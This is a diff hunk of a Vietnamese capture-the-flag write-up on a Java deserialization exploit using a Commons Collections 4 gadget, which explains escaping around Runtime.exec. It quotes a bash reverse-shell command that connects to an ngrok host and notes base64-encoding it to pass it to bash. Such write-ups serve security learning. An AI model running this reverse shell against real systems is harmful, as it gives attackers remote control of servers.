@@ -141,7 +141,7 @@ public class Exploit {
 **Lưu ý**: 
 1. Server(docker) không có các tool như curl, ping, nc,... nên không thể sử dụng để lấy luôn flag được, phải lấy được shell.
 2. Method `getObject()` khi tạo payload CC4 nhận arg command dưới dạng là 1 string, cái mà sẽ được nạp vào method `Runtime.getRuntime.exec(string)` để thực thi command. Mà method [exec(string) trong Java sẽ tự động split string dựa vào dấu space thành 1 string array](https://askcodes.net/coding/why-does-runtime-exec-string--work-for-some-but-not-all-commands-) để pass như các command arguments cho nên chỗ command này mình cần escape dấu space. 
-2. `Runtime.getRuntime.exec()` có nhiều hạn chế hơn 1 shell bình thường nên 1 số ký tự, command không thể intepret hay escape nên ví dụ với command `bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13992 0>&1` có chứa `>&` thì cần được escape nên mình base64 encode luôn đoạn này.
+2. `Runtime.getRuntime.exec()` có nhiều hạn chế hơn 1 shell bình thường nên 1 số ký tự, command không thể intepret hay escape nên ví dụ với command `bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13992 0>&1` có chứa `>&` thì cần được escape nên mình base64 encode luôn đoạn này và nạp vào bash.
 
 ![unknown](https://user-images.githubusercontent.com/71699412/196038602-0b373191-5a43-46db-9487-cbd9c684a216.png)
 
